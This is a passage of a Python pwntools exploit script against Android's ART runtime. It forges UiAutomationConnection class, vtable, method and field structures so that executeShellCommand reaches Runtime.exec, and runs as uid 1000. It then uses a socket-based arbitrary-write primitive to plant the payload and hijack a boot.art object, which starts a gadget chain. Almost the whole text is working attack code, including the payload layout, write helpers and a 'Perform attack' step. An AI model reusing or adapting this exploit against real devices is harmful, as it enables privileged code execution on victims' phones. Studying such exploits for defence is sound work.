    UIAutomationConnection_class.num_reference_instance_fields_ = 0x7
    UIAutomationConnection_class.num_reference_static_fields_ = 0x1
    UIAutomationConnection_class.object_size_ = 0x45
    UIAutomationConnection_class.object_size_alloc_fast_path_ = 0x48
    UIAutomationConnection_class.primitive_types_ = 0x20000
    UIAutomationConnection_class.reference_instance_offsets_ = 0x1fcf
    UIAutomationConnection_class.status = 0xf0000000
    UIAutomationConnection_class.copied_methods_offset_ = 0x1c
    UIAutomationConnection_class.virtual_methods_offset_ = 0x9

    # UiAutomation::executeShellCommand uses interface invoke for UiAutomationConnection::executeShellCommand,
    # so cover this with a final fake vtable.
    UIAutomationConnection_method_executeShellCommand = ArtMethod(
        address_declaring_class=address_map['UIAutomationConnection_class'],
        dex_method_index=0,#0x3a2d,
        method_index=0,#0x29,
        address_bytecode=UIAutomationConnection_method_executeShellCommand_address,
        address_interpreter_stub=address_interpreter_stub
    )
    
    UIAutomationConnection_method_executeShellCommandStderr = ArtMethod(
        address_declaring_class=address_map['UIAutomationConnection_class'],
        dex_method_index=0,#0x3a2e,
        method_index=0,#0x2a,
        address_bytecode=UIAutomationConnection_method_executeShellCommandStderr_address,
        address_interpreter_stub=address_interpreter_stub
    )

    UIAutomationConnection_vtable = VTable([
        address_map['UIAutomationConnection_vtable'] + 0x10
    ] + [
        address_map['UIAutomationConnection_method_executeShellCommand']
        for _ in range(UIAutomationConnection_vtable_index_executeShellCommandStderr)
    ] + [
        address_map['UIAutomationConnection_method_executeShellCommandStderr']
    ] + [
        address_map['UIAutomationConnection_method_executeShellCommand']
        for _ in range(UIAutomationConnection_vtable_size - UIAutomationConnection_vtable_index_executeShellCommandStderr - 1 - 1)  # -1 for IMT ptr, -1 for manual index
    ])

    # 2. Create ifields for access to locals needed to reach Runtime.getRuntime().exec(command)
    # which internally performs a fork+exec. So app may crash afterwards, because command is run
    # anyways in a stable environment.
    UIAutomationConnection_mIsShutdown = ArtField(
        address_declaring_class=address_map['UIAutomationConnection_class'],
        offset=UIAutomationConnection.is_shutdown_offset(),
        field_dex_idx=0#0x31f1
    )
    UIAutomationConnection_mIsShutdown.access_flags_ = 0x2

    UIAutomationConnection_mClient = ArtField(
        address_declaring_class=address_map['UIAutomationConnection_class'],
        offset=UIAutomationConnection.client_offset(),
        field_dex_idx=0#0x31ef
    )
    UIAutomationConnection_mClient.access_flags_ = 0x2

    UIAutomationConnection_mOwningUid = ArtField(
        address_declaring_class=address_map['UIAutomationConnection_class'],
        offset=UIAutomationConnection.owning_uid_offset(),
        field_dex_idx=0#0x31f3
    )
    UIAutomationConnection_mOwningUid.access_flags_ = 0x2

    UIAutomationConnection_mLock = ArtField(
        address_declaring_class=address_map['String_class'],    # Using empty String object for synchronization, i.e. a NON-FAKE CLASS
        offset=UIAutomationConnection.lock_offset(),
        field_dex_idx=0#0x31f2
    )

    UIAutomationConnection_ifields = IFields([
        UIAutomationConnection_mIsShutdown,
        UIAutomationConnection_mClient,
        UIAutomationConnection_mOwningUid,
        UIAutomationConnection_mLock,
    ])
    assert (UIAutomationConnection_ifields.length() == UIAutomationConnection_ifields_size)

    # 3. Build UiAutomationConnection object
    UIAutomationConnection_object = UIAutomationConnection(
        declaring_class_=address_map['UIAutomationConnection_class'],
        mClient=1,
        mOwningUid=1000,
        mIsShutdown=0,
        mLock=address_map['String_object']  # use command string, because this is actually a valid object
    )

    # 4. Merge connection - related components into payload
    payload_layout.update({
        address_to_offset(address_map['UIAutomationConnection_class']): UIAutomationConnection_class.build() + UIAutomationConnection_vtable.build(),
        address_to_offset(address_map['UIAutomationConnection_method_executeShellCommand']): UIAutomationConnection_method_executeShellCommand.build(),
        address_to_offset(address_map['UIAutomationConnection_method_executeShellCommandStderr']): UIAutomationConnection_method_executeShellCommandStderr.build(),
        address_to_offset(address_map['UIAutomationConnection_ifields']): UIAutomationConnection_ifields.build(),
        address_to_offset(address_map['UIAutomationConnection_object']): UIAutomationConnection_object.build()
    })

    # Interact with target and forward payload.
    def custom_pp_dict(obj):
        from copy import deepcopy
        obj = deepcopy(obj)
        for key in obj:
            if isinstance(obj[key], int):
                obj[key] = hex(obj[key])
        pprint.pprint(obj)

    custom_pp_dict(payload_layout)
    payload = pwn.flat(payload_layout)
    assert (len(payload) < 0x1000)

    # Perform attack
    def wait_for_debugger() -> None:
        input('<enter>')

    def write_qword(client: PwnClient, address: int, value: int) -> None:
        assert (address & (2**64 - 1)) == address, f'{hex(address)} does not fit into qword.'
        assert (value & (2**64 - 1)) == value, f'{hex(value)} does not fit into qword.'
        assert (address >= 0), f'{index} must be non - negative.'
        client.send_int(1)  # stay in receive loop
        client.send_long(address)  # choose address
        client.send_long(value) # choose qword to write to stack

    def write_bytes(client: PwnClient, address: int, buffer: bytes) -> None:
        assert (buffer)
        buffer += b'\x00' * (8 - (len(buffer) % 8))
        for i in range(len(buffer) // 8):
            write_qword(client, address + i * 8, pwn.u64(buffer[8 * i: 8 * (i + 1)]))

    client = PwnClient('127.0.0.1', 8080)

    wait_for_debugger()

    # Set up payload
    write_bytes(client, address_buffer, payload)

    # Hijack GRANDFATHERED object in boot.art. Next call to GRANDFATHERED.get kicks of gadget chain execution.
    write_bytes(client, address_target_object, VirtualKeyboard_object.build())

    wait_for_debugger()

    client.close()


if __name__ == '__main__':
    main()